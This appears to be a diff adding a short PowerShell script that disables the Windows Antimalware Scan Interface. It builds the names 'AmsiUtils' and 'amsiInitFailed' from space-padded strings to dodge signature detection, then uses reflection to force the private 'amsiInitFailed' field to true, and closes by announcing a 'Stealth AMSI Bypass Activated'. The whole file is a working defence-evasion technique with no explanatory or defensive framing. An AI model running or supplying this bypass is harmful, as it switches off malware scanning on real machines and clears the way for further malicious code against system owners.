@@ -1,0 +1,11 @@
+function g($a){$a -replace ' ','' -replace '\+','' -replace '\-',''}
+
+$base = g "System.Management.Automation.A m s i U t i l s"
+$t = [Ref].Assembly.GetType($base)
+
+$fName = g "a m s i I n i t F a i l e d"
+$field = $t.GetField($fName, 'NonPublic,Static')
+
+$field.SetValue($null, $true)
+
+Write-Host "[+] Stealth AMSI Bypass Activated" -ForegroundColor Green
